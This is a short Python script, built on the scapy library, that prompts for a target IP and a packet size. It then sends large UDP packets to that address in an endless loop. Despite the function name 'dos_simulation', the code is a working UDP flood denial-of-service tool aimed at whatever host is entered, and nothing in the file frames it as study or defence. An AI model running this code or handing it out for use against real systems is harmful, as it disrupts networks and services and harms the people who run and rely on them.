import scapy.all as scp

ip_dst = input("Target IP: ")
pkg_size = input("Package Size (blank for max): ")


def dos_simulation(ip_dst, pkg_size):
    if not (pkg_size):
        pkg_size = 65500

    ip_layer = scp.IP(dst=ip_dst)
    udp_layer = scp.UDP()
    raw_layer = scp.Raw(int(pkg_size))

    package = ip_layer / udp_layer / raw_layer

    scp.send(package, loop=1)
    print(package)


dos_simulation(ip_dst, pkg_size)
